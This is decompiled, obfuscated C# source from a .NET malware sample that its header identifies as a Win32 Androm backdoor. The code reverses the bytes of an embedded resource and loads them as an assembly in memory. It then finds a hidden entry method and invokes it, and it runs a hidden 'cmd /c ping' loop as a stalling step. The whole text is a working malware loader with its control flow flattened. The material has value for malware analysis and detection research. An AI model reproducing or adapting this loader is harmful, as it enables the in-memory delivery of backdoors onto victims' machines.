// Decompiled with JetBrains decompiler
// Type: Ufzzt.Ref
// Assembly: Scan01, Version=1.0.0.14, Culture=neutral, PublicKeyToken=null
// MVID: 56905CF9-2DE6-4EF6-83F0-13537D151CBC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Backdoor.Win32.Androm.gen-e961ac85380ccd346de98c4a55e10b837b9a77b7d31ec7a312b61b484e32c932.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Ufzzt.Properties;

namespace Ufzzt
{
  internal class Ref
  {
    private static string _Algo;
    private static Ref CloneInterpreter;

    internal static void IncludeRef()
    {
label_5:
      bool flag = Ref._Algo == null;
      int num1 = 2;
      while (true)
      {
        int num2;
        List<byte> byteList;
        int index;
        byte[] numArray;
        switch (num1)
        {
          case 1:
            Ref._Algo = Assembly.Load((byte[]) Ref.ReadInterpreter((object) byteList)).FullName;
            num1 = 6;
            continue;
          case 2:
            if (flag)
            {
              num2 = 7;
              break;
            }
            goto label_14;
          case 3:
            ++index;
            goto case 4;
          case 4:
            if (index >= numArray.Length)
            {
              num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_2ac32bc3c2124019a509b76b40bac10c == 0 ? 5 : 2;
              continue;
            }
            goto default;
          case 5:
            Ref.ConnectInterpreter((object) byteList);
            num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_a9b2f97be5ee4f48ae84b8d055243594 != 0 ? 0 : 1;
            continue;
          case 6:
            goto label_5;
          case 7:
            byteList = new List<byte>();
            numArray = (byte[]) Ref.WriteInterpreter();
            num2 = 8;
            break;
          case 8:
            index = 0;
            num1 = 4;
            continue;
          default:
            byte num3 = numArray[index];
            byteList.Add(num3);
            num1 = 3;
            continue;
        }
        num1 = num2;
      }
label_14:;
    }

    internal static void OrderRef()
    {
      Assembly[] assemblyArray = (Assembly[]) Ref.DestroyInterpreter((object) Thread.GetDomain());
      int index1 = 0;
      int num1 = 10;
      if (\u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_4195317c23c549fc8ac4b70e6b260bda != 0)
        goto label_26;
label_2:
      while (true)
      {
        int num2;
        MethodInfo methodInfo;
        string str;
        Assembly assembly;
        System.Type[] exportedTypes;
        int index2;
        System.Type type;
        bool flag;
        int index3;
        MethodInfo[] methods;
        switch (num1)
        {
          case 1:
          case 17:
            goto label_13;
          case 2:
            flag = (string) Ref.FlushInterpreter((object) methodInfo) == "Haoljjpxizlzixqxgqoxdf";
            num1 = 6;
            continue;
          case 3:
            ++index2;
            num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_76e87162ff374ff798fbaa2f8d2f4932 == 0 ? 16 : 12;
            continue;
          case 4:
          case 16:
            if (index2 < exportedTypes.Length)
            {
              num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_67867a4c335143cdad93e1dc1864982f != 0 ? 15 : 1;
              continue;
            }
            ++index1;
            goto case 10;
          case 5:
            index2 = 0;
            num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_46d2442dbac344bdba2833e3e34367ff != 0 ? 1 : 4;
            continue;
          case 6:
            if (flag)
            {
              num2 = 13;
              break;
            }
            goto label_13;
          case 7:
            goto label_25;
          case 8:
            methodInfo = methods[index3];
            num1 = 2;
            continue;
          case 9:
            exportedTypes = assembly.GetExportedTypes();
            num1 = 5;
            continue;
          case 10:
            if (index1 < assemblyArray.Length)
            {
              assembly = assemblyArray[index1];
              num1 = 9;
              continue;
            }
            num1 = 7;
            continue;
          case 11:
            if (index3 < methods.Length)
            {
              num1 = 8;
              continue;
            }
            goto case 3;
          case 12:
            if (!string.IsNullOrWhiteSpace(str))
            {
              int num3 = (int) Ref.PopInterpreter((object) str);
              num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_f29e2295a699475c8f85a1aff1691ee7 == 0 ? 1 : 1;
              continue;
            }
            num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_3e842e4b01994263875520e19bfc2fdf == 0 ? 17 : 3;
            continue;
          case 13:
            str = (string) methodInfo.Invoke((object) null, (object[]) null);
            num2 = 12;
            break;
          case 14:
            index3 = 0;
            goto case 11;
          case 15:
            type = exportedTypes[index2];
            num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_47504f35e1fa4885ab6225032571bca5 == 0 ? 0 : 0;
            continue;
          default:
            methods = type.GetMethods();
            num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_788e368c31d5494c8440b6f84ed33987 != 0 ? 4 : 14;
            continue;
        }
        num1 = num2;
        continue;
label_13:
        ++index3;
        num1 = 11;
      }
label_25:
      return;
label_26:
      num1 = 2;
      goto label_2;
    }

    internal static void SetRef()
    {
      int num1 = 1;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            num2 = 0;
            num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_76e87162ff374ff798fbaa2f8d2f4932 != 0 ? 0 : 0;
            continue;
          case 2:
            ++num2;
            num1 = 3;
            continue;
          case 4:
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd";
            processStartInfo.Arguments = "/c ping yahoo.com";
            Ref.DefineInterpreter((object) processStartInfo, ProcessWindowStyle.Hidden);
            Ref.AssetInterpreter(Ref.SelectInterpreter((object) processStartInfo));
            num1 = \u003CModule\u003E\u007B7e67c5a5\u002D72aa\u002D4076\u002Db31e\u002D9b35911b2b84\u007D.m_688920eceb2148c585912860ab8d1a12.m_33433561a12446a99f741954ba56f4cb == 0 ? 1 : 2;
            continue;
          default:
            if (num2 < 10)
              goto case 4;
            else
              goto label_6;
        }
      }
label_6:;
    }

    internal static object WriteInterpreter() => (object) Resources.Zyqdwxjryuicxldtn;

    internal static void ConnectInterpreter([In] object obj0) => ((List<byte>) obj0).Reverse();

    internal static object ReadInterpreter([In] object obj0) => (object) ((List<byte>) obj0).ToArray();

    internal static bool VisitInterpreter() => Ref.CloneInterpreter == null;

    internal static Ref ComputeInterpreter() => Ref.CloneInterpreter;

    internal static object DestroyInterpreter([In] object obj0) => (object) ((AppDomain) obj0).GetAssemblies();

    internal static object FlushInterpreter([In] object obj0) => (object) ((MemberInfo) obj0).Name;

    internal static DialogResult PopInterpreter([In] object obj0) => MessageBox.Show((string) obj0);

    internal static void DefineInterpreter([In] object obj0, [In] ProcessWindowStyle obj1) => ((ProcessStartInfo) obj0).WindowStyle = obj1;

    internal static object SelectInterpreter([In] object obj0) => (object) Process.Start((ProcessStartInfo) obj0);

    internal static void AssetInterpreter([In] object obj0) => ((Process) obj0).WaitForExit();
  }
}
